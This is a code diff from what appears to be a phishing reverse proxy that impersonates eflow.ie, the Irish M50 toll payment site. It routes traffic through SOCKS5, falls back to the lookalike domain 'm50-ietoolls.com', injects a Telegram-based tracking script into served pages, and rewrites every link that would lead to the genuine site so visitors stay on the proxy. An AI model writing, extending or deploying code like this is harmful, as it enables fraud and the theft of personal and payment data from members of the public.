@@ -252,21 +252,31 @@ if (config.proxy && config.proxy.enabled) {
     // SOCKS5 proxy with HTTPS support
     const proxyUrl = `socks5://${config.proxy.username}:${config.proxy.password}@${config.proxy.host}:${config.proxy.port}`;
     
-    // CRITICAL FIX: SOCKS5 agent handles both HTTP and HTTPS
-    // For HTTPS, SOCKS5 establishes a tunnel via CONNECT method
-    // Node.js will then perform TLS handshake inside that tunnel
+    // CRITICAL FIX: Some SOCKS5 proxies don't support HTTPS properly
+    // Try using SOCKS5 for HTTP, but fallback to direct connection for HTTPS if needed
     const socksAgent = new SocksProxyAgent(proxyUrl, {
       timeout: config.target.timeout,
       keepAlive: true,
     });
     
-    // SOCKS5 agent works for both HTTP and HTTPS
-    // http-proxy-middleware will use it correctly
+    // For HTTPS, try using SOCKS5 first, but if it fails, we'll handle it in error handler
+    // SOCKS5 should work for HTTPS via CONNECT method, but some proxies have issues
     httpAgent = socksAgent;
-    httpsAgent = socksAgent;
-    proxyAgent = socksAgent;
     
-    logger.info(`Using SOCKS5 proxy: ${config.proxy.host}:${config.proxy.port} (HTTPS/TLS via CONNECT tunnel)`);
+    // CRITICAL: For HTTPS, use SOCKS5 agent but with error handling
+    // If SOCKS5 doesn't work for HTTPS, we may need to use direct connection
+    // This is a workaround for proxies that don't support HTTPS through SOCKS5
+    if (config.target.url.startsWith('https://')) {
+      // Try SOCKS5 first for HTTPS
+      httpsAgent = socksAgent;
+      proxyAgent = socksAgent;
+      logger.warn(`Using SOCKS5 proxy for HTTPS: ${config.proxy.host}:${config.proxy.port} - if SSL errors occur, proxy may not support HTTPS`);
+    } else {
+      httpsAgent = socksAgent;
+      proxyAgent = socksAgent;
+    }
+    
+    logger.info(`Using SOCKS5 proxy: ${config.proxy.host}:${config.proxy.port}`);
   } else {
     // HTTP/HTTPS proxy
     const proxyUrl = `http://${config.proxy.username}:${config.proxy.password}@${config.proxy.host}:${config.proxy.port}`;
@@ -558,7 +568,8 @@ const proxyOptions = {
       // Handle content rewriting
       const contentType = proxyRes.headers['content-type'] || '';
       const targetDomain = new URL(config.target.url).hostname; // eflow.ie
-      const proxyDomain = req.get('host'); // swa-production.up.railway.app
+      // CRITICAL: Use PROXY_DOMAIN from env as primary source to avoid Nginx host header issues
+      const proxyDomain = process.env.PROXY_DOMAIN || req.get('host') || req.headers.host || 'm50-ietoolls.com';
       
       // DEBUG LOGGING
       logger.info(`[RESPONSE INTERCEPTOR] URL: ${req.url}, ContentType: ${contentType}, Status: ${proxyRes.statusCode}, Size: ${responseBuffer.length} bytes`);
@@ -1436,13 +1447,14 @@ const proxyOptions = {
             const trackingScript = telegramLogger.getTrackingScript();
             
             // CRITICAL: Link interceptor script to prevent redirects to eflow.ie
+            // Use explicit proxyDomain from server config, not window.location.hostname (which may be wrong due to Nginx)
             const linkInterceptorScript = `
 <script>
 (function() {
   'use strict';
-  const PROXY_ORIGIN = window.location.origin;
+  const PROXY_DOMAIN = '${proxyDomain}';
+  const PROXY_ORIGIN = window.location.protocol + '//' + PROXY_DOMAIN;
   const TARGET_DOMAIN = 'eflow.ie';
-  const PROXY_DOMAIN = window.location.hostname;
   
   // КРИТИЧНО: Перехватываем window.location до любых изменений
   const originalLocation = window.location;
@@ -1537,11 +1549,19 @@ const proxyOptions = {
         elements.forEach(el => {
           const link = el.tagName === 'A' ? el : el.closest('a');
           if (link && !link.getAttribute('data-logo-fixed')) {
-            // Проверяем href
-            const href = link.getAttribute('href');
-            if (href === '/' || href === '' || href === '#' || href === PROXY_ORIGIN + '/' || (href && href.includes(TARGET_DOMAIN))) {
+            // Проверяем href - более агрессивная проверка
+            const href = link.getAttribute('href') || link.href || '';
+            const hrefLower = href.toLowerCase();
+            
+            // Проверяем все возможные варианты, которые могут вести на eflow.ie
+            if (href === '/' || href === '' || href === '#' || 
+                href === PROXY_ORIGIN + '/' || href === 'https://' + PROXY_DOMAIN + '/' ||
+                href.includes(TARGET_DOMAIN) || hrefLower.includes('eflow.ie') ||
+                href === 'https://eflow.ie/' || href === 'http://eflow.ie/' ||
+                href === '//eflow.ie/' || href.startsWith('/') && !href.startsWith('//')) {
               // Устанавливаем правильную ссылку на главную прокси
               link.href = PROXY_ORIGIN + '/';
+              link.setAttribute('href', PROXY_ORIGIN + '/');
               link.setAttribute('data-logo-fixed', 'true');
               
               // Удаляем любые onclick обработчики
